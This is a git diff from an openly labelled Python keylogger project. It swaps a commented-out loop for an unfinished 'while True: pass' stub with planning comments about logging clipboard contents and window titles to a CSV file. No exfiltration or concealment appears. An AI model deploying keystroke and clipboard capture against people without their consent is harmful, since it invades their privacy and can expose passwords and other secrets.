@@ -50,14 +50,19 @@ def main():
         initialise_log_file(csvreader)  # Note user info and starting date + time of keylogger.
         kc_logger_object = kclogger.KeysClipboardLogger(csvreader)  # Start keylogger.
         window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
-        # while True:
-        #     # Als minuut voorbij gegaan of van scherm gewisseld: haal data op
-        #     if check_if_time_passed(old_time, note_interval_seconds) or window_logger_object.screen_changed():
-        #         old_time = time.time()
-        #         log_time(csvreader, old_time)
-            #
-            # window_logger_object.log_window()
-            # kc_logger_object.log_clipboard()
+        while True:
+            # csv_file.writerow(["datetime", "application_title", "window_title", "data_ID", "logged_data"])
+            pass
+            # if window change
+            # if window_logger_object.screen_changed():
+                # save currently logged data to csv with old time + old app & window data + data ID = 0
+
+            # if minute passed
+                # save currently logged data to csv with old time + old / current app & window data + data ID = 0
+            # if clipboard changed
+                # save currently logged data to csv with old time + old / current app & window data
+                # save clipboard data to csv with new time + old / current app & window data + data ID = 1
+
 
 
 if __name__ == '__main__':
